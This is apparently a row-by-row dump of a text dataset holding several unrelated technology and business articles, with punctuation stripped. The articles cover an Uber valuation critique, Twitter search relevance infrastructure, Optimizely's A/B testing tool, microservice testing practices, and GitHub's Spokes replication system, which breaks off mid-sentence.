Cost of Revenue  Uber only made gross margins of  25m  and GM was actually negative in the second quarter   Although recently the CEO claimed they were profitable in the US  that still means  unless I m missing something from these leaked financials  they made almost no money on actual rides on the aggregate  even before all their other expenses   For a business that is highly price elastic  e g  if you raise prices by 50   consumers will definitely respond by purchasing much less   that is very concerning because it means they haven t proven that their core product is fundamentally and sustainably profitable in any way that is consistent with their valuation  They are still selling  10 bills for  10 07  There is a valid argument that they are profitable in markets where they have hit scale  but that still means they are fundamentally reliant on that scale to make money   We make money with scale and market dominance  is not the same as  every time we deliver our service  we make lots of money    3  Growing as quickly as Uber is ridiculously hard and causes issues that are invisible to the public  They seem to have a very aggressive  opportunistic  wall street  us against the world culture that is probably necessary for this kind of growth  but it makes you worry about what skeletons have been buried along the way  How will they react in the face of serious adversity  or declining growth    4  No insiders are allowed to sell their shares  Seems like something you would do if you were trying to ruthlessly control the messaging around your company valuation because you re not sure the business really backs up that valuation   5  Uber is avoiding going public  and they are getting progressively easier  dumber money  from people who literally aren t allowed to look at their financials  I understand that operating a public company is pretty heinous compared to running it privately  but it also raises suspicion that the public markets will destroy the story they ve created about their valuation and the business behind it  and they are really just avoiding that reality check   It made sense for Facebook to put off going public   Zuckerberg didn t want a bunch of wall street guys fucking up his business by making him monetize in stupid ways  He was smarter than they were  and he knew he was better off not having to listen to them about something as nuanced and sensitive as monetization  Uber  the business  has much less to risk by going public and dealing with wall street interference  unless it is worried about the business being damaged by the destruction of its SVCOTFTWE myth    6  Uber essentially sells a commodity product  although I will concede some people have a brand preference for Uber or Lyft   first mover advantage does matter   Commodity products need monopolies or contractual agreements to be substantially profitable   otherwise open competition drives the profit margins towards zero because the only way commodities can compete is on price  At the moment  Uber has neither a monopoly nor contractual agreements to leverage to profitability  Also  people hate monopolies and will only use them as a last resort  see  cable companies  an October 2014 blog post I wrote saying people should use Lyft instead of Uber to keep prices low and slow down an Uber monopoly on ride sharing    7  At some point gas prices will go up again and that will make rides more expensive  affecting the supply demand equation in some way  scary for a business that sells a price elastic  commodity good that is reliant on a two sided marketplace   8  They keep experimenting with other businesses   like UberEATS  Either they are just that aggressive that they can successfully add new dimensions to their business while going a million miles per hour already  or they are secretly concerned about the fundamental profitability of rides liquidity of the system and need another source of profits from drivers   9  Uber gets sued for things that fundamentally mess with their business model  independent contractors instead of employees    If that wasn t enough  there is a clear  next evolution  for Uber s market   autonomous cars  With other companies  you know they will get disrupted somehow  but you aren t sure  With Uber  we all know that whatever business they are building now will have to be rebuilt under a different paradigm in the next 5 15 years   And when autonomous cars come  so do the other tech giants who need massive markets to fuel growth   Apple  Google  Amazon  as well as Tesla and the auto industry  The tech giants don t have to actually make any money with the rides business  because their core businesses throw off so much cash   but Uber does  Would you want to be a business that had to make money selling a product competing against a business that didn t   Let s quiet the more  instinctive  alarm bells now and take a more analytical  business school approach  using Porter s Five Forces to assess Uber s level of power in the business context   Supplier Power  Uber has low medium supplier power   Uber has negative supplier power because suppliers  drivers    Have no binding contracts to guarantee supply at a price   Uber has a much different supplier power than a steel company with a 5 year contract with an iron ore mine that has a set price  Are totally fragmented  Can easily switch to competitors and sell the same good  you see tons of Uber drivers who also drive for Lyft  and some also work for companies like DoorDash and Postmates   Have a degree of pricing power  in that they can easily switch to another low skill  on demand job  Uber has positive supplier power because suppliers  drivers    Like driving for Uber when they can earn enough   driving people around is pretty chill as far as low skill jobs go  The supply of underpaid or underutilized low skill labor appears to be on a permanently upward trend  which is shitty for the world  but good for Uber  Buying Power  Uber has medium buyer power   Uber has negative buyer power because buyers  riders    Demand is price elastic  Surge pricing affects demand short term  and permanent price rises will affect demand long term  When my deodorant raises prices 50   thanks Old Spice    I m still buying it  but if Uber raises prices 50   short or long term   I m trying to take a Lyft or not relying on Uber as my primary ride sharing service  If the price is raised 75  or more  I m taking a Taxi or finding another mode of transport or not going   Have very low switching costs  only need to download Lyft or another app and save credit card   Uber has positive buyer power because buyers  riders    Are fragmented and have no power to individually drive down price   Competitive Rivalry  Uber has high competitive rivalry  for now    Uber has negative competitive rivalry power because competitive rivalry   Comes from Lyft in the US  who has raised  2b  including from General Motors and Andreesen Horowitz  and is still fighting them hard  Comes from other massive firms like Didi Kuaidi  who are well funded and competing tooth and nail abroad   causing Uber to lose  1b year in China alone   Uber has positive competitive rivalry power because competitive rivalry   Only comes from companies with super deep pockets because they have to compete on price for a long  long time  Only comes from companies that can execute at the extremely high level that Uber has demonstrated  Threat of Substitution  Uber has high threat of substitution   Uber has negative power from threat of substitution because threat of substitution   Comes from the fact that people have been getting from point A to point B  locally  for all of human history  Uber did not invent something that people cannot live without  and people are used to weighing alternative ways to accomplish local transport  As a substitute to Uber  people can walk  bike  get a ride  take a bus  drive  take a taxi  or just not go   Arises because some of these options  public transportation and taxis  provide veritable price ceilings on how much Uber can charge  for now  while they still exist    Uber has positive power from threat of substitution because threat of substitution   Decreases as habits are built and solidified  People are already relying on Uber and ignoring other options   Threat of New Entry  Uber has medium threat of new entry now  and a high threat of new entry in the near  5 10 year  future   Uber has negative power from the threat of new entry because   Uber cannot contractually lock down their early mover advantage  The main problem Uber has had to solve is how to get a driver to be able to pick up a passenger in less than five minutes  To do this  Uber has done the hard work of selling to both sides of this marketplace  but they cannot lock them up with contracts  leaving them vulnerable to later entrants who operate more efficiently   Rides are a price elastic commodity  so many drivers and passengers will use another service for a better deal  Uber has taken all the arrows in the chest  charging the hill  and building this marketplace  but it is possible that someone could come in and get all the benefits of their hard work  or continue to drive their margins negative    Uber will eventually need to make money from rides to be an ongoing business  future competitors won t  Amazon   needs to improve their ability to deliver packages quickly to areas with people  could be same drivers as the ones who take people   needs more things to sell to make Amazon Prime compelling  could be near term threat  Google Apple Tesla Big Auto   has data  developing driverless cars  massive long term threat   Even if they win the near term  driverless cars will require Uber to entirely change what they do  and any competitive advantage and moat achieved erodes rapidly   Uber has very little value if it doesn t create a monopoly   it is a two sided marketplace  If you lose either supply or demand  you re screwed   Uber has positive power from the threat of new entry because   Uber is a force of nature  It has deep pockets  moves fast  has bottomless ambition  and isn t afraid to fight  This deters future competitors and increases its chances of winning these future battles   Uber knows these competitors exist  They aren t flying blind thinking nothing can go wrong  and paranoia goes a long way to fighting off new entrants   In summary  Uber has low medium buyer power  medium supplier power  high competitive rivalry  high threat of substitution  and a long term high threat of new entrants  That does not scream to me the same level of dominance as Microsoft in the 90s  Google in the 00s  and Facebook in the 2010s  They are not an ATM machine  printing money in a virtual monopoly   they may very well get there  but they are not there yet  and the path ahead is rocky   Conclusion  Uber has created an amazing product and grown at an astounding rate with incredible execution  It may very well thread the needle and validate being anointed the Silicon Valley Company of the Future That Wins Everything  but it is far from the certainty we are led to believe  and we should not take everything we hear on blind faith   It seems like the Silicon Valley industrial complex promotes hero companies like Uber as a reaction to the generally cynical and risk averse perspective outside the startup world  It needs to have a SVCOTFTWE like Uber to show the rest of the world that their optimistic investing and hopeful belief in the power of technology is the correct approach  To challenge the supremacy of the SVCOTFTWE means you re just an outsider and just don t get it  which  for the record  was totally true in the case of Google and Facebook    And on the aggregate  Silicon Valley optimism is totally validated   wonderful products and services are created that we need and on the whole  it makes the world a better place  The people who work there are really  really smart   but sometimes it is worth double checking to make sure is it actually ice cream being spoon fed into your mouth  not something else that tastes a little funny  could actually be shit  or become ice cream after 5 10 more years of grueling execution   Comments did not survive the site transfer,"[281 1016 1086 673 952 1300 778 809 1295 843 500]"
293,training-dataset/engineering/644.txt,engineering,Search Relevance Infrastructure at TwitterMillions of people all over the world search on Twitter every day to see what s happening  During major events such as the recent Euro 2016 final  we observe record traffic spikes as people turn to Twitter to find timely information and perspectives  and overall traffic volume has been steadily increasing over time  The Search Quality team at Twitter works on returning the best quality results for our users   Compared to traditional information retrieval applications  the Twitter search challenge is unique  for a few reasons   Real time Intent   A large proportion of our searches have a strong intent to find topical  real time information  The state of the world moves rapidly and in some cases  results that are even a few minutes old can feel outdated and irrelevant  Query suggestions  i e  typeahead  spelling and related searches  also need to be fresh and real time     A large proportion of our searches have a strong intent to find topical  real time information  The state of the world moves rapidly and in some cases  results that are even a few minutes old can feel outdated and irrelevant  Query suggestions  i e  typeahead  spelling and related searches  also need to be fresh and real time  Corpus Size  The corpus being searched on is huge  with hundreds of millions of new Tweets being created daily  in many languages   The corpus being searched on is huge  with hundreds of millions of new Tweets being created daily  in many languages  Document Format  The documents have unique properties  140 characters of unstructured text  but with rich entity types including hashtags    mentions  images  videos  and external links  Unlike web pages  Tweets don t have hyperlinks between themselves  so link based algorithms like PageRank cannot be used directly for ranking   The documents have unique properties  140 characters of unstructured text  but with rich entity types including hashtags    mentions  images  videos  and external links  Unlike web pages  Tweets don t have hyperlinks between themselves  so link based algorithms like PageRank cannot be used directly for ranking  Multiple Result Types  The search results page is a blend of multiple types of results including Tweets  other accounts  images  videos  news articles  related searches and spelling suggestions  The different result types need to be ranked against each other in order to compose a page that best satisfies the searcher s intent   The search results page is a blend of multiple types of results including Tweets  other accounts  images  videos  news articles  related searches and spelling suggestions  The different result types need to be ranked against each other in order to compose a page that best satisfies the searcher s intent  Personalization  Each searcher has their own social graph  interests  location and language preferences  so results need to be personalized in order to be relevant   In order to return relevant  high quality search results at this scale with low latency  we need to solve interesting and novel technical challenges in a variety of areas  information retrieval  natural language processing  machine learning  distributed systems  data science  etc   Over the last few months  we ve made significant investments in our search relevance infrastructure with the goal of improving ranking capabilities and experimentation efficiency  This post highlights some of this work  Note that this is distinct from our core indexing and retrieval platform components that we query in production to retrieve Tweets  unranked    Real Time Signal Ingester  The variety and timeliness of signals used by our ranking models have a huge impact on the ultimate quality of search results  Additionally  many of the signals mutate rapidly after the Tweets have been indexed  so we need to keep them up to date  We wrote a new Heron based signal ingester to process streams of raw signals and produce features for our ranking components to use in production  We added flexible schemas for encoding and decoding new feature updates dynamically with minimum code changes and operational overhead  As the Twitter app evolves  we can quickly add and test new ranking signals that become available and appear promising in offline experiments   Fast  Lightweight Experimentation  The faster and cheaper we can make the ideate  test  iterate loop  the more ideas we can test and the more we can innovate  We make heavy use of traditional A B testing  but we ve also built a complementary offline experimentation system to test changes more efficiently  Twitter search results and queries churn rapidly  so to separate signal from noise we built a sandbox environment that freezes the state of the world at a given point in time so we can generate stable  reproducible results for any change we want to test  In order to gain better insight  we ve added tooling to analyze and display differences between results  and easily obtain judgment labels from in house human raters based on our Search Quality Judgment Guidelines  One particularly nice benefit is that this allows us to validate expensive index changes  e g  adding new index fields for retrieval  tokenization updates  etc   and refine them before deploying to production   Training and Deploying Machine Learned Models  Machine learned models are commonly used for search ranking as they provide a principled and automatic way to optimize feature weights and integrate new ranking features  To make them work well  it s important to identify the right objective functions to optimize that correlate well with ultimate customer satisfaction  We established a pipeline to seamlessly collect training data sets for model training and validation  and deploy trained models to production servers  Scale brings additional challenges  e g  the first stage of search ranking happens on index shards within a very tight loop where a large number of matching documents for a query are scored under strict CPU  memory and latency constraints  We worked with the Twitter Cortex team to create a lightweight runtime that enables running models under these constraints and deployed ranking models trained using our internal ML platform tools  e g  Whetlab   These are critical building blocks that have allowed us to test and ship many relevance gains making search better for our users  In future posts  we ll dive deeper into specific aspects of search quality and projects we re currently working on  Stay tuned   Acknowledgements  The Search Quality team is Tian Wang  Juan Caicedo  Zhezhe Chen  Jinliang Fan  Lisa Huang  Gianna Badiali  Yan Xia and Yatharth Saraf  We would also like to thank the Search Infrastructure  Heron and Cortex teams for invaluable assistance at various stages,"[293 1409 686 1374 980 1336 673 1422 778 1418 669]"
298,training-dataset/business/90.txt,business,How Optimizely Shrunk Google s Market Share by 92 How Optimizely Shrunk Google s Market Share by 92   Back in the mid 2000s  it was pretty difficult to gain a quantitative understanding of how your marketing efforts were working out  The only real A B testing tool available was Google Website Optimizer   It looked like this   The process was painful  You had to take your page  think about all the different sections you wanted to A B test  and put in script tags  For each test you wanted to run  you had to create a new page  And there was no way of easily visualizing all of this information understanding the results of your tests was an exercise in frustration   For your average marketer  it was practically impossible  Website Optimizer had been built by engineers for engineers  while the people who actually needed to be running A B tests were left scratching their heads   Then in 2010  Optimizely launched  By thinking deeply about who needed to do this job rather than just what needed to be done  then designing a tool specifically for that market  Optimizely revolutionized A B testing on the web  And all they had to do was take out steps   Tuning the Desire Machine  Evan Williams  one of Twitter s co founders  gives his secret to building a billion dollar internet company    Take a human desire  preferably one that has been around for a really long time  Identify that desire and use modern technology to take out steps    The desires that Williams describes aren t about summoning a car or a side of fries with a tap on your phone  They re more basic and immutable  getting from point A to point B  or just eating food  We want what we ve always wanted  What technology allows us to do is get it faster and without having to think about it   Reducing steps requires some of the deepest thinking because it requires you to design for simplicity  rather than adding complexity  It s about breaking problems down to their most basic form   The best ideas come from deeply thinking about how to make things easier for other people  and help them accomplish their goals with the minimum amount of effort  You might get there with tech  but that s also the part you should think about last   11 Steps   Google Website Optimizer  Setting up a single A B test with Google Website Optimizer was a long  nontrivial process  Here are the 11 steps Google outlined for setting up an experiment   Name Experiment and Identify Pages   1  Name your experiment  For example  Sign up Form AB Test  2  Set your original test page URL  http   www mysite com sign up html  3  Set your first variation test page URL  http   www mysite com sign up b html  4  Set your  optional  second variation test page URL  http   www mysite com sign up c html  5  Set your conversion page URL  http   www mysite com thank you html  Install and Validate JavaScript Tags for   Original test page   6  Add the Control Script at the top of the page  7  Add the Tracking Script at the bottom of the page  First Variation test page   8  Add the Tracking Script at the bottom of the page  Second variation test page   9  Add the Tracking Script at the bottom of the page  Conversion page   10  Add the Conversion Script  A B Experiment Set up  Preview and Start Experiment  11  Review the data  test the pages using the  preview  function  and then launch your test  And that was only if you were trying to run a single test on a static web page  If you wanted to add different variations  you had to keep poring through code  If you had a dynamic page  you really had to hack it to work  At each step of the way  because you were altering the code of every page on your web site  there was a chance that you d introduce an error and have to start over     Sean Ellis  who was VP of Marketing at Logmein at the time  wrote    One way I have worked around my engineering deficiencies has been to hire the skills onto the marketing team  For example  in my last long term VP Marketing role I hired a front end designer engineer to design and code landing pages and a dedicated DBA to build reports and run ad hoc queries    Marketers like Sean Ellis who could acquire great engineering talent could run more tests  learn faster  and grow  Most marketers however  especially at startups  simply didn t have the resources to accomplish this   3 Steps   Optimizely  In 2010  former Google product managers Dan Siroker and Pete Koonen launched Optimizely their deeply thought solution to this problem  Optimizely couldn t run more powerful tests than Google  but it did provide a graphic interface to run and manage the tests   All marketers had to do was install a single line of Javascript on their site  That line generated a simple WYSIWYG editor that let them point and click to pick the site elements they wanted to test  Results were easy to access and learn from   Optimizely cut GWO s 11 step process into three short steps   Insert Optimizely Javascript snippet in the head tag of your site  Open up the visual editor  and click on each section of the site you want to test  For each variation  click  add variation   then click start experiment to preview and launch test   The number of steps it took to A B test from turning to an engineer  pointing out the elements of your web page that you wanted to test  and having them insert script tags for each was drastically cut down     Optimizely thought deeply about the problem  and solved some of the hard technical problems behind building a WYSIWYG   When they launched in 2010  Google Website Optimizer was all but abandoned  Marketers were suddenly able to run many types of experiments on their own  and all the A B testing tools you see today solve the problem in the way that Optimizely did first  Optimizely took over the A B testing marketing  and six years later  they still have the lion s share   How to Build the Habit for Deep Thinking  It would have been easy to improve on Website Optimizer by adding bells and whistles  Optimizely could have built a more powerful or more feature rich version of the tool everyone knew  But by thinking deeply  Optimizely was actually able to cut features  make it less powerful  and create a far more useful tool in the process   When we hear about a problem  our instinct is to jump in with a bunch of different solutions  Far more often than not  these are scattershot fixes that don t get at the root causes of the problem  They do more harm than help   Thinking deeply about reducing steps isn t something that comes naturally to us it takes practice and time   Ask the opposite  When building product  the internal biases and assumptions you hold often obscure the real problem  When you come up with a hypothesis about a product or really anything ask yourself   What if the opposite were true   Force yourself to keep to this line of reasoning for an hour and challenge each assumption you make   When building product  the internal biases and assumptions you hold often obscure the real problem  When you come up with a hypothesis about a product or really anything ask yourself   What if the opposite were true   Force yourself to keep to this line of reasoning for an hour and challenge each assumption you make  Storyboard the steps  Create a chart of the problem your problem s trying to solve  and write out each step no matter how large or small it currently takes for them to solve it  Look for high friction areas where you can make things easier and more efficient   Create a chart of the problem your problem s trying to solve  and write out each step no matter how large or small it currently takes for them to solve it  Look for high friction areas where you can make things easier and more efficient  Create a concept car  Optimizely takes the idea of the  concept car  from auto production to describe prototypes of a futuristic looking thing  only with software  Instead of thinking about your limitations  think deeply about what the future could look like  This is another way of working backwards  It allows you to build from the end goal out   Building the habit of thinking deeply starts with baby steps,"[298 150 1101 1235 300 778 712 1029 713 1252 550]"
300,training-dataset/engineering/282.txt,engineering,A Proposed Recipe for Designing  Building and Testing Microservices   SpectoLabsBy Daniel Bryant  danielbryantuk  Here at SpectoLabs HQ we have been working alongside our friends at OpenCredo to help several organisations build and deploy microservice based applications  Most of these organisations are looking to migrate away from  or augment  their current monolithic application  and we ve also been involved with a few greenfield prototypes   We ve learned lots along the way  and today we are keen to share our findings in how to design  build and test microservice based systems   Our approach  Broadly speaking we take the following high level approach to designing and implementing microservice based systems   1  Design the system  Determine service boundaries  a  Often the completion of elements from step 2c   Three Amigos   and 6  end to end acceptance tests based our core user journeys  are needed to drive the overall system design  as developing an understanding of the application system user journeys is essential for building something that actually delivers business value   i  On a related note  if you are migrating from a monolith please do ensure that you have a specification  ideally acceptance tests  before you begin the migration  as it is very difficult to build  or re architect  something that establishes parity with an existing system  the phrase  just make it do what the old system did  always makes us shudder   b  If we are working with a current monolithic application the first step is to identify the cohesive areas of business functionality within the existing system  Following domain driven design  DDD  nomenclature  these areas of business functionality are called the bounded contexts  c  When working with a greenfield application the process used to identify the bounded contexts is similar to b  but with the added challenges of the business functionality entities not yet being fully defined  or understood   Because of this  some people argue that you shouldn t start building an application with microservices  but we ll leave that argument for another day  d  Taking our cues from Simon Brown  we re fans of just enough upfront design and therefore there is an argument that the entire system doesn t need to be designed before the other steps below can begin  All of the steps presented here are typically worked on in an iterative fashion  For example  during step 2 we often discover that a proposed service s initial scope is too big or too small  and so we change the system design accordingly  e  This step can take some time  but the output is typically a context map which represents the first pass at defining the application service boundaries  2  Design the service APIs  Determine service functionality  a  Once service boundaries have been defined we can now work with the relevant business owners  domain experts and the development team to define service functionality and the associated interfaces   the Application Programming Interfaces  APIs   b  We can try and define all the service APIs upfront  but in reality the process of designing the services will often be undertaken in turn  with the associated development occurring after each service is designed   in groups of related functionality  or in parallel with other steps in this list  in particular steps 3 and 1   c  We like using the behaviour driven design  BDD  technique named  the Three Amigos   and see a lot of value in the  shifting left  of the QA team to work alongside business stakeholders and developer to define requirements  d  The typical outputs from this step include  a series of BDD style acceptance tests that asserts component  single microservice  level requirements  for example Cucumber Gherkin syntax acceptance test scripts  and an API specification  for example a Swagger or RAML file  which the test scripts will operate against  3  Build services outside in  a  Now we have our API specification and associated  service level  business requirements we can begin building the service functionality outside in   b  Following Toby Clemson s excellent article on microservice testing  this is where we use both integration testing and unit testing  both social and solitary   frequently using a double loop TDD approach  c  Frequently when building complex functionality you will have to integrate with other services  both internal  controlled by you  and external  owned by third parties   and for this we typically use tooling like Tom Akehurst s WireMock or our open source Hoverfly service virtualisation tool to simulate the associated service interface  d  Steps 3 and 4 often occur iteratively  but the output from this step is a  increasing series of  services that provide well tested functionality  4  Component test  a  In combination with building a service outside in we also work on component level testing  This differs from the integration testing mentioned in 3b in that component testing operates via the public API and tests an entire slice of business functionality  Typically the first wave of component tests utilise the acceptance test scripts we defined in 2c  and these assert that we have implemented the business functionality correctly within this service  b  We also like to test non functional requirements  NFRs   which we prefer to call  cross functional tests   within this step  Examples of these tests include   i  Performance testing of a series of core happy paths offered by the service  We typically use JMeter often triggered via the Jenkins Performance Plugin  or Gatling  often run via flood io   ii  Basic security testing using a framework like Continuum Security s bdd security  which includes the awesome OWASP ZAP  iii  Fault tolerance testing  where we deterministically simulate failures and increased response latency from additional internal external services using Hoverfly and associated middleware  and in the past  Saboteur   iv  Visibility testing  which asserts that the service offers the expected endpoints for metrics and health checks  and can assert that logging and alerting has been configured correctly  We typically use tools like REST assured to assert API endpoints are configured correctly  c  Referencing Toby Clemson s work again  we like to test at the component level using both  in process   for quick iterations  and  out of process   for more realistic deployment style tests   i   In process  testing means that the entire test and service under test is run in process  In order to allow a complete slice of business functionality to be tested a service will often rely on some other external component  be that another internal service  a third party external service  a data store or a messaging solution   1  For internal services and external services we typically use our open source Hoverfly service virtualiser executed via the Hoverfly JUnit Rule  2  For data stores we typically use in memory solutions like HSQLDB or Chris Batey s Stubbed Cassandra  3  For messaging solutions we use Apache Qpid for embedded AMQP  or many of the commercial offerings offer a  mock  mode like AWS SQS or open source options like FakeSQS  d  The output of this step is a series of services that have both their business functionality and cross functional requirements validated via a robust continuous delivery build pipeline  5  Contract test  Verify the component interactions  a  At this step of the process we are looking to verify the proposed interaction between components  We assume that services are correctly providing the functionality they offer via their APIs  which has been asserted in step 4   b  A popular approach for this in the microservice world is by using consumer driven contracts  and this can be implemented using frameworks like the Ruby based Pact  and the associated Pact JVM and Pact Go   Pacto  or Node js consumer contracts  c  There is no denying contract testing is very valuable  but on some projects we have found the overhead of maintaining  and running  these tests too high in relation to the guarantees they provided over and above our E2E tests  defined in step 6    d  Our suspicion is that contract testing will become more valuable as we deal with ever more complex systems that have multiple cohesive localised bundles of functionality  or as we experiment with multiple distributed teams implementing microservices based primarily via the API specification and acceptance tests  e  Outputs from this step include a series of supplier and consumer contracts   pacts   that can be cross validated as part of a continuous delivery build pipeline run  6  End to end  E2E  tests  Asserting system level business functionality and NFRs  a  Work on this final step of the design and test process here can be started even before step 1  as E2E automated tests essentially assert core user journeys and application functionality  and prevent regression   b  We typically also test non functional cross functional requirements as defined on 4b above on core  happy path  user journeys through the system  For example  asserting that all critical business journey as working  they respond within a certain time  and they are secure  c  When E2E tests touch external systems or internal systems that are not available or are unreliable  e g  a mainframe based service   then we often use Hoverfly to simulate the API  This has the added benefit of additional control  in that we can simulate increased latency or deterministically simulate failure scenarios using Hoverfly middleware  d  All the systems we have worked on also have some degree of manual testing  which ranges from verifying new functionality works as expected  that the UX of new UI or API elements is acceptable  or the practice of an in depth penetration security test  e  Outputs from this step of the process should include  a correctly functioning and robust system  the automated validation of the system  and happy customers   Key assumptions  You have a fully functional build pipeline  Finally  we re also keen to mention that core practices like continuous delivery  automated environment provisioning  and monitoring alerting are essential for the successful delivery of microservices  as argued in Martin Fowler s  Microservice Prerequisites    We ll also caution against the challenges of handling data within a microservice based application  particularly when migrating from a monolith  see Christian Posta s  The Hardest Part About Microservices  Your Data     Classic QA maxims like the test pyramid and agile testing quadrants should also be used to guide how many tests  and how much effort  should be put into each step  and we strongly recommend reading the great work of Lisa Crispin and Janet Gregory   Parting thoughts  The approach documented above is very much work in progress  and was heavily influenced by Toby Clemson s original microservice testing work  We wanted to publish this to share our ideas and start a conversation on whether this is the best approach   At SpectoLabs we are working on creating both open source and commercial tooling to help organisations develop  test and manage microservice based applications  and we would be very keen to hear about your current microservice testing challenges   As mentioned in the article above  we have already released our open source Hoverfly service virtualisation API simulation tool  and we are receiving some great feedback about how people are using this across the entire test life cycle  Please do drop us a line if you are using Hoverfly   we re always interested in how people are using this application,"[300 1351 1029 150 1235 520 61 234 278 935 773]"
308,training-dataset/product/735.txt,product,How Do You Know If You ve Achieved Product Market Fit My name is Sachin Rekhi and I m Founder   CEO   Notejoy,"[308 582 1408 941 1323 85 1101 606 794 171 737]"
310,training-dataset/engineering/148.txt,engineering,Building resilience in SpokesSpokes is the replication system for the file servers where we store over 38 million Git repositories and over 36 million gists  It keeps at least three copies of every repository and every gist so that we can provide durable  highly available access to content even when servers and networks fail  Spokes uses a combination of Git and rsync to replicate  repair  and rebalance repositories   What is Spokes   Before we get into the topic at hand building resilience we have a new name to announce  DGit is now Spokes   Earlier this year  we announced  DGit  or  Distributed Git   our application level replication system for Git  We got feedback that the name  DGit  wasn t very distinct and could cause confusion with the Git project itself  So we have decided to rename the system Spokes   Defining resilience  In any system or service  there are two key ways to measure resilience  availability and durability  A system s availability is the fraction of the time it can provide the service it was designed to provide  Can it serve content  Can it accept writes  Availability can be partial  complete  or degraded  is every repository available  Are some repositories or whole servers slow   A system s durability is its resistance to permanent data loss  Once the system has accepted a write a push  a merge  an edit through the website  new repository creation  etc  it should never corrupt or revert that content  The key here is the moment that the system accepts the write  how many copies are stored  and where  Enough copies must be stored for us to believe with some very high probability that the write will not be lost   A system can be durable but not available  For example  if a system can t make the minimum required number of copies of an incoming write  it might refuse to accept writes  Such a system would be temporarily unavailable for writing  while maintaining the promise not to lose data  Of course  it is also possible for a system to be available without being durable  for example  by accepting writes whether or not they can be committed safely   Readers may recognize this as related to the CAP Theorem  In short  a system can satisfy at most two of these three properties   consistency  all nodes see the same data  availability  the system can satisfy read and write requests  partition tolerance  the system works even when nodes are down or unable to communicate  Spokes puts the highest priority on consistency and partition tolerance  In worst case failure scenarios  it will refuse to accept writes that it cannot commit  synchronously  to at least two replicas   Availability  Spokes s availability is a function of the availability of underlying servers and networks  and of our ability to detect and route around server and network problems   Individual servers become unavailable pretty frequently  Since rolling out Spokes this past spring  we have had individual servers crash due to a kernel deadlock and faulty RAM chips  Sometimes servers provide degraded service due to lesser hardware faults or high system load  In all cases  Spokes must detect the problem quickly and route around it  Each repository is replicated on three servers  so there s almost always an up to date  available replica to route to even if one server is offline  Spokes is more than the sum of its individually failure prone parts   Detecting problems quickly is the first step  Spokes uses a combination of heartbeats and real application traffic to determine when a file server is down  Using real application traffic is key for two reasons  First  heartbeats learn and react slowly  Each of our file servers handles a hundred or more incoming requests per second  A heartbeat that happens once per second would learn about a failure only after a hundred requests had already failed  Second  heartbeats test only a subset of the server s functionality  for example  whether or not the server can accept a TCP connection and respond to a no op request  But what if the failure mode is more subtle  What if the Git binary is corrupt  What if disk accesses have stalled  What if all authenticated operations are failing  No ops can often succeed when real traffic will fail   So Spokes watches for failures during the processing of real application traffic  and it marks a node as offline if too many requests fail  Of course  real requests do fail sometimes  Someone can try to read a branch that has already been deleted  or try to push to a branch they don t have access to  for example  So Spokes only marks the node offline if three requests fail in a row  That sometimes marks perfectly healthy nodes offline three requests can fail in a row just by random chance but not often  and the penalty for it is not large   Spokes uses heartbeats  too  but not as the primary failure detection mechanism  Instead  heartbeats have two purposes  polling system load and providing the all clear signal after a node has been marked as offline  As soon as a heartbeat succeeds  the node is marked as online again  If the heartbeat succeeds despite ongoing server problems  retrieving system load is almost a no op   the node will get marked offline again after three more failed requests   So Spokes detects that a node is down within about three failed operations  That s still three failed operations too many  For clean failures connections refused or timeouts all operations know how to try the next host  Remember  Spokes has three or more copies of every repository  A routing query for a repository returns not one server  but a list of three  or so  up to date replicas  sorted in preference order  If an operation attempted on the first choice replica fails  there are usually two other replicas to try   A graph of operations  here  remote procedure calls  or RPCs  failed over from one server to another clearly shows when a server is offline  In this graph  a single server is unavailable for about 1 5 hours  during this time  many thousands of RPC operations are redirected to other servers  This graph is the single best detector the Spokes team has for discovering misbehaving servers   Spokes s node offline detection is only advisory i e   only an optimization  A node that has had three failures in a row just gets moved to the end of the preference order for all read operations  rather than removed from the list of replicas  It s better for Spokes to try a probably offline replica last  than to not try it at all   This failure detector works well for server failures  when a server is overloaded or offline  operations to it will fail  Spokes detects those failures and temporarily stops directing traffic to the failed server until a heartbeat succeeds  However  failures of networks and application  Rails  servers are much messier  A given file server can appear to be offline to just a subset of the application servers  or one bad application server can spuriously determine that every file server is offline  So Spokes s failure detection is actually MxN  each application server keeps its own list of which file servers are offline  or not  If we see many application servers marking a single file server as offline  then it probably is  If we see a single application server marking many file servers offline  then we ve learned about a fault on that application server  instead   The figure below illustrates the MxN nature of failure detection and shows in red which failure detectors are true if a single file server  dfs4   is offline   In one recent incident  a single front end application server in a staging environment lost its ability to resolve the DNS names of the file servers  Because it couldn t reach the file servers to send them RPC operations or heartbeats  it concluded that every file server was offline  But that incorrect determination was limited to that one application server  all other application servers worked normally  So the flaky application server was immediately obvious in the RPC failover graphs  and no production traffic was affected   Durability  Sometimes  servers fail  Disks can fail  RAID controllers can fail  even entire servers or entire racks can fail  Spokes provides durability for repository data even in the face of such adversity   The basic building block of durability  like availability  is replication  Spokes keeps at least three copies of every repository  wiki  and gist  and those copies are in different racks  No updates to a repository pushes  renames  edits to a wiki  etc  are accepted unless a strict majority of the replicas can apply the change and get the same result   Spokes needs just one extra copy to survive a single node failure  So why a majority  It s possible  even common  for a repository to get multiple writes at roughly the same time  Those writes might conflict  one user might delete a branch while another user pushes new commits to that same branch  for example  Conflicting writes must be serialized that is  they have to be applied  or rejected  in the same order on every replica  so every replica gets the same result  The way Spokes serializes writes is by ensuring that every write acquires an exclusive lock on a majority of replicas  It s impossible for two writes to acquire a majority at the same time  so Spokes eliminates conflicts by eliminating concurrent writes entirely   If a repository exists on exactly three replicas  then a successful write on two replicas constitutes both a durable set  and a majority  If a repository has four or five replicas  then three are required for a majority   In contrast  many other replication and consensus protocols have a single primary copy at any moment  The order that writes arrive at the primary copy is the official order  and all other replicas must apply writes in that order  The primary is generally designated manually  or automatically using an election protocol  Spokes simply skips that step and treats every write as an election selecting a winning order and outcome directly  rather than a winning server that dictates the write order   Any write in Spokes that can t be applied identically at a majority of replicas gets reverted from any replica where it was applied  In essence  every write operation goes through a voting protocol  and any replicas on the losing side of the vote are marked as unhealthy unavailable for reads or writes until they can be repaired  Repairs are automatic and quick  Because a majority agreed either to accept or to roll back the update  there are still at least two replicas available to continue accepting both reads and writes while the unhealthy replica is repaired   To be clear  disagreements and repairs are exceptional cases  GitHub accepts many millions of repository writes each day  On a typical day  a few dozen writes will result in non unanimous votes  generally because one replica was particularly busy  the connection to it timed out  and the other replicas voted to move on without it  The lagging replica almost always recovers within a minute or two  and there is no user visible impact on the repository s availability   Rarer still are whole disk and whole server failures  but they do happen  When we have to remove an entire server  there are suddenly hundreds of thousands of repositories with only two copies  instead of three  This  too  is a repairable condition  Spokes 